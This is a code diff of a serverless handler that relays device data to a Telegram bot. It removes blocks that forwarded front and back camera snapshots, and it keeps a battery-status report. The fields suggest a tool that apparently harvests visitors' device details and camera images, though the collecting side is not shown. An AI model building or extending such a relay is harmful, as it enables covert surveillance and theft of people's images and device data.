@@ -34,12 +34,8 @@ export default async (req, res) => {
 
     `🔋 **Battery:**\n` +
     `- Level: ${d.batteryLevel}\n` +
-    `- Charging: ${d.charging}\n\n` +
+    `- Charging: ${d.charging}\n`;
 
-    `📷 **Camera Status:**\n` +
-    `- ${d.cameraStatus}\n`;
-
-    // Send the main message
     await fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
       {
@@ -52,37 +48,6 @@ export default async (req, res) => {
         })
       }
     );
-
-    // Send images if they exist
-    if (d.frontCameraImage) {
-      await fetch(
-        `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: telegramId,
-            photo: d.frontCameraImage,
-            caption: 'Front Camera Snapshot'
-          })
-        }
-      );
-    }
-
-    if (d.backCameraImage) {
-      await fetch(
-        `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: telegramId,
-            photo: d.backCameraImage,
-            caption: 'Back Camera Snapshot'
-          })
-        }
-      );
-    }
 
     res.status(200).json({ success: true });
   } catch (error) {
